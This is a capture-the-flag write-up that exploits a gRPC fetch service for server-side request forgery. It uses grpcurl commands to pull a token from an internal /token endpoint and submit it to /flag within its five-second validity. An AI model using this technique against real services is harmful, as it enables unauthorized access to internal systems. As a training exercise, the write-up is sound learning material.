# Catch the goose — writeup (raw)

We are given several public files:

* `Happy_Log.pcapng` (packet capture)
* `fetch.proto` (gRPC protocol definition)
* `flag_server.py` (Python source of the internal flag server)

The goal is to exploit a **gRPC-based SSRF** (Server-Side Request Forgery) and retrieve the flag from a protected internal server.

## **Challenge Analysis**

Quick recall: if you already solved the challenge named “Catch the goose”, you will notice that there is something with grpc here.

/token → /flag

### **1. Understanding the Internal Flag Server (`flag_server.py`)**

The Python file defines a web server with three main endpoints:

* `/token` (`GET`): Generates and returns a **short-lived token**
* `/flag` (`POST`): If sent a valid token, returns the **flag**
* `/` (`GET`): Returns “Meow” (irrelevant)
* All other URLs: Return 404

### **How Tokens Work**

* When `/token` is accessed via GET, it generates a SHA256 hash using the current Unix timestamp and a secret key. This token is only valid for **5 seconds** (`TOKEN_VALIDITY = 5`).
* When `/flag` is accessed via POST, it expects a form field called `token` containing a valid token. If the token is expired or incorrect, it responds with 401 Unauthorized.

### **Key Code Sections**

```python

@app.route("/token", methods=["GET"])
def get_token():
    token, timestamp = generate_token()
    return token

@app.route("/flag", methods=["POST"])
def get_flag():
    token = request.form.get('token')
    if not token:
        return "Token required", 401
    if not verify_token(token):
        return "Invalid token", 401
    return FLAG

```

---

### **2. The SSRF Vector: gRPC Fetch Service**

We do **not** have direct access to the Flask server. Instead, we have a gRPC-based "fetch" service described by `fetch.proto`, running at

`chal.78727867.xyz:6666`.

### **The Proto File Lets Us:**

* Specify a **URL**, **HTTP method** (GET, POST, etc.), **headers**, and **body** for an HTTP request
* The server will perform this request **from its own perspective** (internal SSRF!), and return the result.

### **Relevant Proto Message**

```

message FetchRequest {
  string url = 1;
  string method = 2;
  map<string, string> headers = 3;
  string body = 4;
}

```

This means we can **fully control** the HTTP request made by the server, including method, headers, and body.

---

### **3. Network Analysis: Wireshark**

The provided `Happy_Log.pcapng` file contains network traffic.

* Using Wireshark, we filter for `grpc` traffic and see HTTP2/gRPC requests to `/fetch.FetchService/FetchURL`.
* One of the packets contains a POST request with a body including a SHA256 hash, likely the token.

**Key finding:**

We see gRPC requests from the user to `chal.78727867.xyz:6666`, and the gRPC server forwarding SSRF HTTP requests internally (like `GET /token` and `POST /flag`).

---

## **Exploitation Steps**

### **Step 1: Get a Valid Token via SSRF**

We use `grpcurl` to tell the fetch service to **GET `/token`** from its own `localhost:80`:

```bash

grpcurl -plaintext -proto fetch.proto \
  -d '{"url":"http://localhost:80/token","method":"GET","headers":{}}' \
  chal.78727867.xyz:6666 fetch.FetchService/FetchURL

```

* This returns a JSON object with a `"content"` field containing a token:

  ```

  {
    "content": "2b5cd0b3684c7d0c585aafe0fe8c29431233dc655fb5728f932ec771e25f65f7"
  }

  ```

### **Step 2: Submit the Token via SSRF POST**

Within **5 seconds**, we POST this token to `/flag` via the same SSRF vector:

```bash

grpcurl -plaintext -proto fetch.proto \
  -d '{"url":"http://localhost:80/flag","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"token=2b5cd0b3684c7d0c585aafe0fe8c29431233dc655fb5728f932ec771e25f65f7"}' \
  chal.78727867.xyz:6666 fetch.FetchService/FetchURL

```

* If successful, the server replies with:

  ```

  {
    "content": "NHNC{YuMMyeeeE_GOOOd_ChAL_rIGHT}"
  }

  ```

## Thats the flag
